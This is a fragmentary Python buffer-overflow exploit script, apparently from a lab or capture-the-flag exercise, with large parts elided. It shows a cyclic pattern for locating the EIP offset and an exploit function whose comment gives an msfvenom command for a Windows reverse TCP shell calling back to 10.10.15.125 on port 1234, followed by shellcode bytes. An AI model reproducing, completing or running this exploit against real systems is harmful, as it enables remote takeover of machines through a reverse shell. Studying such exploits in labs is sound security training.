...
def eip_offset():
    pattern = bytes(
        ...
        "5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co",
        "utf-8",
    )
...
def exploit():
    # msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.15.125 LPORT=1234 -f 'python'
    buf = b""
    ...
    buf += b"\x0f\x7d\x68\x02\x00\x04\xd2\x89\xe6\x6a\x10\x56"
